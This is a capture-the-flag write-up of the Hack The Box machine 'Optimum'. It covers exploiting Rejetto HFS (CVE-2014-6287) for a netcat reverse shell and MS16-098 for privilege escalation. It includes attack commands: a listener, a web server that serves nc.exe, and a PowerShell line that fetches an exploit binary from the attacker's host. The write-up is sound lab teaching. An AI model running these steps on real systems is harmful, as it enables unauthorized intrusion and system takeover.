---
title: Optimum
date: 2022-06-11 15:08:08
img: /medias/images/optimum/Optimum.png
author: 0xma
categories: 
  - windows
  - hackthebox
tags:
  - hackthebox
  - htb-optimum
  - ctf
  - nmap
  - windows
  - httpfileserver
  - hfs
  - searchsploit
  - cve-2014-6287
  - nishang
  - winpeas
  - watson
  - sherlock
  - process-architechure
  - ms16-032
  - cve-2016-0099 htb-bounty
---
# [Easy] Optimum

![Untitled](/medias/images/optimum/Optimum.png)

## Reconnaissance

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```bash
sudo nmap -sC -sV -O -oA nmap/initial <IP>
```

- **sC**: run default nmap scripts
- **sV**: detect service version
- **O**: detect OS
- **oA**: output all formats and store in file *nmap/initial*

We get back the following result showing that only one port is open:

**Port 80:** running HttpFileServer httpd 2.3.

![Untitled](/medias/images/optimum/Untitled%201.png)

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```bash
sudo nmap -sC -sV -O -p- -oA nmap/full <IP>
```

We get back the following result. No other ports are open.

![Untitled](/medias/images/optimum/Untitled%202.png)

Similarly, we run an nmap scan with the **sU** flag enabled to run a UDP scan.

```bash
sudo nmap -sU -O -p- -oA nmap/udp <IP>
```

We get back the following result.

Our initial recon shows that our only point of entry is through exploiting the HTTP File Server.

## Enumeration

Browse to the HTTP File server.

![Untitled](/medias/images/optimum/Untitled%203.png)

It seems to be a server that allows you to remotely access your files over the network. There’s a login page that might be using default credentials. This could potentially allow us to gain an initial
foothold. Let’s google the server name and version to learn more about it.

[https://www.exploit-db.com/exploits/39161](https://www.exploit-db.com/exploits/39161)

![Untitled](/medias/images/optimum/Untitled%204.png)

The first two google entries are publicly disclosed exploits that would give us remote code execution on the box!

Click on the first entry and view the compile instructions.

![Untitled](/medias/images/optimum/Untitled%205.png)

To compile the exploit, we need to perform a few tasks:

1. Host a web server on our attack machine (kali) on port 80 in a directory that has the netcat executable file.
2. Start a netcat listener on the attack machine.
3. Download the exploit and change the *ip_addr* & *local_port* variables __in the script to match the ip address of the attack machine and the port that netcat is listening on.
4. Run the script using python as stated in the *Usage* comment.

Before we do that, let’s try and understand what the script is doing.

![Untitled](/medias/images/optimum/Untitled%206.png)

Everything in purple (in double quotes) is URL encoded. Let’s decode it using an [online encoder/decoder](https://meyerweb.com/eric/tools/dencoder/).

![Untitled](/medias/images/optimum/Untitled%207.png)

Three functions are being called:

- **script_create():** creates a script (*script.vbs*) that when run downloads the nc.exe from our attack machine and saves it to the _C:\Users\Public_ location on the target machine.
- **execute_script():** uses the *csscript.exe* (command-line version of the Windows Script Host that provides command-line options for setting script properties) to run *script.vbs*.
- **nc_run():** runs the the netcat executable and sends a reverse shell back to our attack machine.

Now that we understand what the script is doing, what remains to be answered is why was remote code execution allowed. Further googling tells us the [reason](https://nvd.nist.gov/vuln/detail/CVE-2014-6287).

> The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.
> 

This makes sense. In the exploit, every time a search is done to run arbitrary code, the *%00* sequence is used.

## Gaining an Initial Foothold

Now that we understand the exploit, let’s run it. In the instructions, the first step is to host a web server on our attack machine (kali) on port 80 in a directory that has the netcat executable file.

Locate the Windows netcat executable file in the kali vm.

![Untitled](/medias/images/optimum/Untitled%208.png)

Copy it to the location where the server will be run.

```bash
cp /usr/share/windows-resources/binaries/nc.exe $(pwd)
```

![Untitled](/medias/images/optimum/Untitled%209.png)

Start the HTTP server.

```bash
python2 -m SimpleHTTPServer 80
```

The second step is to start a netcat listener on the attack machine.

```bash
nc -nvlp 4242
```

![Untitled](/medias/images/optimum/Untitled%2010.png)

The third step is to download the exploit and change the *ip_addr* & *local_port* variables __in the script to match the ip address of the attack machine and the port that netcat is listening on.

```bash
searchsploit -m 39161
```

![Untitled](/medias/images/optimum/Untitled%2011.png)

The fourth step is to run the exploit.

We get a non-privileged shell back!

![Untitled](/medias/images/optimum/Untitled%2012.png)

Grab the user flag.

![Untitled](/medias/images/optimum/Untitled%2013.png)

We don’t have system privileges, so we’ll need to find a way to escalate privileges.

## Privilege Escalation

We’ll use [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) to identify any missing patches on the Windows target machine that could potentially allow us to escalate privileges.

First, download the script.

```bash
git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
```

Next, install the dependencies specified in the readme document.

```bash
pip2 install xlrd==1.2.0
```

Update the database.

```bash
./windows-exploit-suggester.py --update
```

This creates an excel spreadsheet form the Microsoft vulnerability database in the working directory.

The next step is to retrieve the system information from the target machine. This can be done using the “systeminfo” command.

![Untitled](/medias/images/optimum/Untitled%2014.png)

Copy the output and save it in a text file “sysinfo.txt” in the Windows Exploit Suggester directory on the attack machine. Then run the following command on the attack machine.

```bash
./windows-exploit-suggester.py --database 2019-10-05-mssb.xls --systeminfo sysinfo.txt
```

![Untitled](/medias/images/optimum/Untitled%2015.png)

The Windows OS seems to be vulnerable to many exploits! Let’s try MS16–098. In the [exploit database](https://www.exploit-db.com/exploits/41020), it gives you a link to a precompiled executable. Download the executable on the attack machine.

![Untitled](/medias/images/optimum/Untitled%2016.png)

```bash
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
```

Now we need to transfer it to the target machine. Start up an HTTP server on attack machine in the same directory that the executable file is in.

```bash
python2 -m SimpleHTTPServer 80
```

In target machine download the file in a directory you have write access to.

```bash
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.50/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"
```

![Untitled](/medias/images/optimum/Untitled%2017.png)

We have system! Grab the root flag.

![Untitled](/medias/images/optimum/Untitled%2018.png)

## Lesson Learned

Always update and patch your software! To gain both an initial foothold and escalate privileges, we leveraged publicly disclosed vulnerabilities that have security updates and patches available.